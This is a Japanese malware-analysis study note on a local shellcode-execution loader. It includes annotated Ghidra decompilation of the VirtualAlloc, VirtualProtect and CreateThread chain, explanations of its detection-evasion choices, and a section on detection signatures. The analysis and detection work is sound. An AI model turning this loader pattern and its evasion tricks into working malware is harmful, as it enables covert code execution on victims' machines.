# Local Payload Execution — Shellcode
**分類:** Code Execution  
**解析環境:** FLARE-VM / Ghidra 11.x  

---

## 概要

シェルコードをプロセスの仮想メモリ上に配置し、`CreateThread` で実行する
基本的な Technique。

このコードの設計上の核心は **二段階のメモリ属性変更** にある。
`VirtualAlloc` 時は `PAGE_READWRITE`（書き込み可能・実行不可）で確保し、
`memcpy` でシェルコードを書き込んだ後に `VirtualProtect` で
`PAGE_EXECUTE_READWRITE` へ変更する。

確保時点から実行可能属性（`0x40`）を指定する単純な実装と比較した場合、
メモリ確保イベントを監視する一部の検出機構に対して
アロケーション時点での検出を遅らせる効果がある。

---

## 実行フロー（Chain of Calls）

```
VirtualAlloc(RW)
  → memcpy          ← .data からシェルコードをコピー
  → memset          ← コピー元をゼロ埋め（痕跡消去）
  → VirtualProtect  ← RW → RWX へ変更
  → CreateThread    ← シェルコードアドレスをエントリポイントとして実行
  → WaitForSingleObject / HeapFree
```

---

## 使用 Windows API と引数の意味

### VirtualAlloc
```
VirtualAlloc(NULL, DAT_140003140, 0x3000, 0x4)
```
| 引数 | 値 | 意味 |
|---|---|---|
| lpAddress | NULL | OS にアドレス選択を委ねる |
| dwSize | DAT_140003140 | シェルコードサイズ（グローバル変数） |
| flAllocationType | 0x3000 | MEM_COMMIT(0x1000) \| MEM_RESERVE(0x2000) |
| flProtect | 0x4 | PAGE_READWRITE — **この時点では実行不可** |

### memcpy
```
memcpy(local_10, &DAT_140003000, DAT_140003140)
```
| 引数 | 値 | 意味 |
|---|---|---|
| dst | local_10 | VirtualAlloc で確保した領域 |
| src | DAT_140003000 | .data セクション上のシェルコード |
| size | DAT_140003140 | コピーサイズ |

> **注意:** `memcpy` 直後に `memset(&DAT_140003000, 0, ...)` でコピー元を
> ゼロ埋めしている。静的解析時に .data セクション上のシェルコードを
> 残さないための処置と考えられる。

### VirtualProtect
```
VirtualProtect(local_10, DAT_140003140, 0x40, lpflOldProtect)
```
| 引数 | 値 | 意味 |
|---|---|---|
| lpAddress | local_10 | 変更対象のメモリ領域 |
| dwSize | DAT_140003140 | 変更するサイズ |
| flNewProtect | 0x40 | PAGE_EXECUTE_READWRITE — **ここで初めて実行可能になる** |
| lpflOldProtect | local_18 | 変更前の属性を受け取る出力引数（必須） |

### CreateThread
```
CreateThread(NULL, 0, local_10, NULL, 0, NULL)
```
| 引数 | 値 | 意味 |
|---|---|---|
| lpStartAddress | local_10 | シェルコードの先頭アドレスをエントリポイントに指定 |
| dwCreationFlags | 0 | 作成直後に即時実行 |

---

## Ghidra 逆コンパイル出力の読み方

```c
// ── フェーズ 1: RW メモリ確保 ──────────────────────────────
pPVar3 = VirtualAlloc((LPVOID)0x0, DAT_140003140, 0x3000, 4);
local_10 = pPVar3;
if (pPVar3 == (LPTHREAD_START_ROUTINE)0x0) {
    // 失敗時: GetLastError → printf でエラーコード出力
    DVar1 = GetLastError();
    printf(s_[!]_VirtualAlloc_Failed_..., (ulonglong)DVar1, ...);
    uVar8 = 0xffffffff;   // 異常終了コード
}
else {

    // ── フェーズ 2: シェルコード書き込み ＋ 元データのゼロ埋め ──
    memcpy(local_10, &DAT_140003000, DAT_140003140);
    // コピー元 (.data 上のシェルコード) をゼロ埋め → 静的痕跡の消去
    memset(&DAT_140003000, 0, DAT_140003140);

    // ── フェーズ 3: 実行権限の付与 ────────────────────────────
    // PAGE_READWRITE(0x4) → PAGE_EXECUTE_READWRITE(0x40) へ変更
    BVar2 = VirtualProtect(local_10, DAT_140003140, 0x40, lpflOldProtect);
    if (BVar2 == 0) {
        DVar1 = GetLastError();
        printf(s_[!]_VirtualProtect_Failed_..., ...);
        uVar8 = 0xffffffff;
    }
    else {

        // ── フェーズ 4: 新規スレッドで実行 ───────────────────────
        // local_10 (シェルコード先頭) をスレッドエントリポイントに指定
        pvVar4 = CreateThread(
            (LPSECURITY_ATTRIBUTES)0x0, 0,
            local_10,        // ← lpStartAddress
            (LPVOID)0x0, 0, (LPDWORD)0x0
        );
        if (pvVar4 == (HANDLE)0x0) {
            DVar1 = GetLastError();
            printf(s_[!]_CreateThread_Failed_..., ...);
        }
    }
}
```

**Graph View の活用:**  
Ghidra の Graph View で見ると、`VirtualAlloc` 失敗・`VirtualProtect` 失敗・
`CreateThread` 失敗の各エラーハンドラが独立したノードとして現れ、
正常パスが中央を縦断する構造として可視化される。
実マルウェアでエラーハンドリングが省略された場合でも
この縦断パスだけ残るため、フロー把握の基点になる。

---

## 解析中に詰まった点と調べたこと

**Q1. `DAT_140003140` と `DAT_140003000` の実体が何かわからなかった。**  
→ Ghidra で各アドレスを右クリック → "References → Show References to" で
クロスリファレンスを追った。`DAT_140003140` はシェルコードサイズを示す
4バイトの整数定数、`DAT_140003000` は `.data` セクション上に静的に
埋め込まれたシェルコード本体だった。

**Q2. `memset` でコピー元をゼロ埋めする理由がわからなかった。**  
→ `.data` セクションはファイルとして静的に存在するため、
シェルコードがそのまま残っていると YARA スキャン等での静的検出対象になる。
ゼロ埋めにより実行時のメモリ上から痕跡を消す意図と判断した。
（ただしファイル自体の `.data` は変更されないため、ファイルベースの検出は防げない。）

**Q3. `VirtualProtect` の `lpflOldProtect` に `local_18` が渡されている理由。**  
→ MSDN を参照すると `lpflOldProtect` は必須の出力引数であり、
NULL を渡すと関数が失敗する。`local_18` はその受け取り用のローカル変数で、
変更前の保護属性が書き込まれる。このコードでは戻り値を使っていないため、
実質的に「関数を成功させるために渡す」形になっている。

---

## 検出の観点（Detection Opportunities）

| 検出手法 | 具体的なシグネチャ |
|---|---|
| API 呼び出し連鎖 | `VirtualAlloc(RW)` → `memcpy` → `VirtualProtect(RWX)` のシーケンス |
| メモリ属性遷移 | 同一領域が RW → RWX へ変化する遷移イベント |
| スレッドエントリポイント | `CreateThread` の `lpStartAddress` がヒープ領域を指している |
| 静的シグネチャ | `.data` セクション上の高エントロピー領域（シェルコード本体） |
| YARA | `VirtualAlloc` + `VirtualProtect` + `CreateThread` の Import 共存 |

---

## 参考リンク
- [VirtualAlloc — MSDN](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)
- [VirtualProtect — MSDN](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [CreateThread — MSDN](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread)
